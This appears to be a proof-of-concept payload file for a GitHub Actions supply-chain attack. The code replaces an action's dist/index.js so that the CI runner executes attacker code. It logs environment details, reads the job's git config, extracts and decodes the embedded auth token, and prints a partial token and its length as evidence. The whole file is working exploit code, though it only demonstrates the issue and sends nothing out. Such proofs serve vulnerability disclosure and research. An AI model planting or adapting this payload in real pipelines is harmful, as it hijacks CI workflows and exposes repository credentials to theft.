// Payload that replaces an action's dist/index.js. Executed by the runner when
// the subsequent `uses:` step for that action starts.
const fs = require('fs')
console.log('RCE_PROOF_MARKER: attacker code executed as action main')
console.log('RCE_PROOF_REPO=' + process.env.GITHUB_REPOSITORY)
console.log('RCE_PROOF_STEP=' + process.env.GITHUB_ACTION)
try {
  const cfg = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/.git/config', 'utf8')
  const m = cfg.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/)
  console.log('RCE_PROOF_GIT_TOKEN_PRESENT=' + (m ? 'yes' : 'no'))
  if (m) {
    const tok = Buffer.from(m[1], 'base64').toString('utf8').split(':')[1]
    console.log('RCE_PROOF_TOKEN_PREFIX=' + tok.slice(0, 4) + '...' + ' len=' + tok.length)
  }
} catch (e) { console.log('RCE_PROOF_GITCFG_ERR=' + e.message) }
fs.writeFileSync(process.env.RUNNER_TEMP + '/rce-proof.txt', 'RCE_PROOF_MARKER\n')
